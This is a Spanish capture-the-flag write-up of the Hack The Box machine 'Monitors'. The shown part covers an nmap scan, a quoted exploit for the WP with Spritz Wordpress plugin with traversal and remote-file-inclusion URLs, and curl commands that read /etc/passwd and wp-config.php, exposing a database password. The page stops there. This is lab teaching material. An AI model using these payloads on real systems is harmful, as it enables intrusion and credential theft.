<!doctype html><html lang=es>
<head>
<title>Monitors | 7Rocky</title><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web de Wordpress con un plugin vulnerable a navegación de directorios, otra página web vulnerable a inyección de código SQL y otra más vulnerable a deserialización insegura dentro de un contenedor de Docker con capabilities habilitadas. Para comprometer la máquina se necesitan conocimientos avanzados de enumeración web, vulnerabilidades y técnicas de explotación, además de técnicas de reenvío de puertos y para escapar de Docker. En este write-up se utiliza un script en Bash personalizado para explotar la deserialización insegura">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/HTB/Monitors/Monitors.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="Monitors">
<meta property="og:description" content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web de Wordpress con un plugin vulnerable a navegación de directorios, otra página web vulnerable a inyección de código SQL y otra más vulnerable a deserialización insegura dentro de un contenedor de Docker con capabilities habilitadas. Para comprometer la máquina se necesitan conocimientos avanzados de enumeración web, vulnerabilidades y técnicas de explotación, además de técnicas de reenvío de puertos y para escapar de Docker. En este write-up se utiliza un script en Bash personalizado para explotar la deserialización insegura">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/htb/monitors/"><meta property="article:section" content="htb">
<meta property="article:published_time" content="2021-10-09T00:00:00+01:00">
<meta property="article:modified_time" content="2022-03-03T11:23:15+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/HTB/Monitors/Monitors.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="Monitors">
<meta itemprop=description content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web de Wordpress con un plugin vulnerable a navegación de directorios, otra página web vulnerable a inyección de código SQL y otra más vulnerable a deserialización insegura dentro de un contenedor de Docker con capabilities habilitadas. Para comprometer la máquina se necesitan conocimientos avanzados de enumeración web, vulnerabilidades y técnicas de explotación, además de técnicas de reenvío de puertos y para escapar de Docker. En este write-up se utiliza un script en Bash personalizado para explotar la deserialización insegura"><meta itemprop=datePublished content="2021-10-09T00:00:00+01:00">
<meta itemprop=dateModified content="2022-03-03T11:23:15+01:00">
<meta itemprop=wordCount content="2599">
<meta itemprop=keywords content="cve,docker,tomcat,wordpress,capabilities,port-forwarding,file-permissions,insecure-deserialization,directory-path-traversal,rce,">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Monitors">
<meta name=twitter:description content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web de Wordpress con un plugin vulnerable a navegación de directorios, otra página web vulnerable a inyección de código SQL y otra más vulnerable a deserialización insegura dentro de un contenedor de Docker con capabilities habilitadas. Para comprometer la máquina se necesitan conocimientos avanzados de enumeración web, vulnerabilidades y técnicas de explotación, además de técnicas de reenvío de puertos y para escapar de Docker. En este write-up se utiliza un script en Bash personalizado para explotar la deserialización insegura">
<meta name=twitter:image content="https://7rocky.github.io/images/HTB/Monitors/Monitors.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div></head><body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/en/htb/monitors/ title=en>
<img alt=en height=32px src=/images/en.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a>
</li><li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a>
</li><li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a>
</li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div></div></nav></div></header><main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/monitors/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/monitors/&text=Monitors" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/monitors/&title=Monitors" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div><h1 class="f1 mt3 mb1">Monitors</h1><time class="f6 mv4 dib tracked" datetime=2021-10-09T00:00:00+01:00>09 / 10 / 2021</time>
</header><div class=htb-image>
<img alt=Monitors src=/images/HTB/Monitors/Monitors.png>
</div><ul class="nested-links tags">
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/cve title=CVE>CVE</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/docker title=Docker>Docker</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/tomcat title=Tomcat>Tomcat</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/wordpress title=Wordpress>Wordpress</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/capabilities title=Capabilities>Capabilities</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/port-forwarding title="Reenvío de puertos">Reenvío de puertos</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/file-permissions title="Permisos de archivos">Permisos de archivos</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/insecure-deserialization title="Deserialización Insegura">Deserialización Insegura</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/directory-path-traversal title="Navegación de directorios">Navegación de directorios</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/rce title="Ejecución remota de comandos">Ejecución remota de comandos</a>
</li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents>
<ul>
<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#exploración-web>Exploración web</a></li><li><a href=#explotando-el-_plugin_-wordpress-spritz>Explotando el <em>plugin</em> Wordpress Spritz</a></li><li><a href=#explotando-cacti>Explotando Cacti</a></li><li><a href=#intrusión-en-la-máquina>Intrusión en la máquina</a></li><li><a href=#analizando-el-contenedor-de-docker>Analizando el contenedor de Docker</a></li><li><a href=#explotando-ofbiz>Explotando OFBiz</a></li><li><a href=#escapando-del-contenedor-de-docker>Escapando del contenedor de Docker</a></li><li><a href=#vía-intencionada-para-conseguir-usertxt>Vía intencionada para conseguir <code>user.txt</code></a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul>
<li>
<strong>SO</strong>: Linux
</li><li>
<strong>Dificultad</strong>: Difícil
</li><li>
<strong>Dirección IP</strong>: 10.10.10.238
</li><li>
<strong>Fecha</strong>: 24 / 04 / 2021
</li></ul><h2 id=escaneo-de-puertos>Escaneo de puertos</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.238 -p 22,80
</span></span><span style=display:flex><span>Nmap scan report for 10.10.10.238
</span></span><span style=display:flex><span>Host is up (0.044s latency).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
</span></span><span style=display:flex><span>|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
</span></span><span style=display:flex><span>|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span style=display:flex><span>|_http-title: Site doesn&#39;t have a title (text/html; charset=iso-8859-1).
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 11.43 seconds
</span></span></code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p><h2 id=exploración-web>Exploración web</h2><p>Si se accede a http://10.10.10.238/ se obtiene el siguiente error:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl http://10.10.10.238/ 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span>Sorry, direct IP access is not allowed. &lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;If you are having issues accessing the site then contact the website administrator: admin@monitors.htb 
</span></span></code></pre></div><p>Es necesario incluir el dominio <code>monitors.htb</code> en el archivo <code>/etc/hosts</code>. Hay una página web de Wordpress en el puerto 80 (utilizando <em>virtual hosts</em>, ya que las peticiones con dirección IP están bloqueadas):</p><p><img src=../../../images/HTB/Monitors/Monitors-Wordpress.png alt="Página de Wordpress"></p><p>Para enumerar la página de Wordpress, se puede emplear <code>wpscan</code>. En este caso, se pueden listar los <em>plugins</em> de Wordpress accediendo a <code>/wp-content/plugins</code>, ya que existe una vulnerabilidad de listado de directorios:</p><p><img src=../../../images/HTB/Monitors/Monitors-Wordpress-plugins.png alt="Plugins de Wordpress"></p><p>Al mirar si existe alguna vulnerabilidad para el <em>plugin</em> <code>wp-with-spritz</code>, se descubre que tiene vulnerabilidades de tipo navegación de directorios (<em>Directory Path Traversal</em>) e inclusión de archivos remotos (RFI):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ searchsploit spritz
</span></span><span style=display:flex><span>------------------------------------------------------------- ----------------------- 
</span></span><span style=display:flex><span> Exploit Title                                               | Path
</span></span><span style=display:flex><span>------------------------------------------------------------- -----------------------
</span></span><span style=display:flex><span> WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion | php/webapps/44544.php
</span></span><span style=display:flex><span>------------------------------------------------------------- -----------------------
</span></span><span style=display:flex><span>Shellcodes: No Results
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ cat 44544.php
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Exploit Title: WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion
</span></span><span style=display:flex><span># Date: 2018-04-25
</span></span><span style=display:flex><span># Exploit Author: Wadeek
</span></span><span style=display:flex><span># Software Link: https://downloads.wordpress.org/plugin/wp-with-spritz.zip
</span></span><span style=display:flex><span># Software Version: 1.0
</span></span><span style=display:flex><span># Google Dork: intitle:(&#34;Spritz Login Success&#34;) AND inurl:(&#34;wp-with-spritz/wp.spritz.login.success.html&#34;) 
</span></span><span style=display:flex><span># Tested on: Apache2 with PHP 7 on Linux
</span></span><span style=display:flex><span># Category: webapps
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>1. Version Disclosure
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/wp-content/plugins/wp-with-spritz/readme.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>2. Source Code
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>if(isset($_GET[&#39;url&#39;])){
</span></span><span style=display:flex><span>$content=file_get_contents($_GET[&#39;url&#39;]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>3. Proof of Concept
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
</span></span><span style=display:flex><span>/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec
</span></span></code></pre></div><h2 id=explotando-el-_plugin_-wordpress-spritz>Explotando el <em>plugin</em> Wordpress Spritz</h2><p>Con este <em>plugin</em> vulnerable a navegación de directorios, es posible leer archivos del servidor. Por ejemplo, <code>/etc/passwd</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl <span style=color:#e6db74>&#39;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd&#39;</span> 
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
</span></span><span style=display:flex><span>syslog:x:102:106::/home/syslog:/usr/sbin/nologin
</span></span><span style=display:flex><span>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>lxd:x:105:65534::/var/lib/lxd/:/bin/false
</span></span><span style=display:flex><span>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
</span></span><span style=display:flex><span>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
</span></span><span style=display:flex><span>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style=display:flex><span>sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
</span></span><span style=display:flex><span>Debian-snmp:x:112:115::/var/lib/snmp:/bin/false
</span></span><span style=display:flex><span>mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false
</span></span></code></pre></div><p>Se puede intentar leer archivos de configuración de Wordpress y buscar credenciales de acceso a la máquina o a una base de datos. Hay una contraseña de MySQL en <code>wp-config.php</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl <span style=color:#e6db74>&#39;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/var/www/wordpress/wp-config.php&#39;</span> 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/**
</span></span></span><span style=display:flex><span><span style=color:#e6db74>...
</span></span></span><span style=display:flex><span><span style=color:#e6db74> */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ** MySQL settings - You can get this info from your web host ** // 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#e6db74>/** The name of the database for WordPress */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_NAME&#39;</span>, <span style=color:#e6db74>&#39;wordpress&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** MySQL database username */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_USER&#39;</span>, <span style=color:#e6db74>&#39;wpadmin&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** MySQL database password */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_PASSWORD&#39;</span>, <span style=color:#e6db74>&#39;BestAdministrator@2020!&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** MySQL hostname */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_HOST&#39;</span>, <span style=color:#e6db74>&#39;localhost&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** Database Charset to use in creating database tables. */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_CHARSET&#39;</span>, <span style=color:#e6db74>&#39;utf8mb4&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** The Database Collate type. Don&#39;t change this if in doubt. */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>( <span style=color:#e6db74>&#39;DB_COLLATE&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span> <span style=color:#a6e22e>ABSPATH</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;wp-settings.php&#39;</span>;
